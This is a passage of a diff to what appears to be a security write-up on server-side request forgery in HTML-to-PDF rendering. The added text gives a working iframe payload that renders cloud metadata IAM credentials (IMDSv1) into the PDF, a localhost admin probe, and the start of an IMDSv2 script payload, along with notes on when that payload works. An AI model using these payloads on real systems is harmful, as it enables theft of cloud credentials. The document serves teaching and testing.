@@ -59,7 +59,14 @@ Because the fetch originates from the server, injected markup reaches hosts the 
 <img src="http://localhost:8080/admin/">
 ```
 
-On cloud instances the metadata service yields instance credentials. For IMDSv2, the required token header needs script:
+On cloud instances the metadata service yields instance credentials. Where the instance still exposes IMDSv1, no token is needed and an `<iframe>` renders the credential JSON straight into the PDF without any cross-origin read, so it works in a default renderer:
+
+```html
+<iframe width="1000" height="1000"
+  src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
+```
+
+IMDSv2 requires a `PUT` for a token and a custom request header, which only script can send. That script path works only in a renderer with web security disabled (`--disable-web-security`) or a build that does not enforce CORS: the requests are cross-origin to `169.254.169.254`, the metadata service returns no CORS headers, and the custom token header forces a preflight it never answers, so `r.text()` cannot read the token or the credential in a default headless-Chrome pipeline. Under that non-default condition:
 
 ```html
 <script>
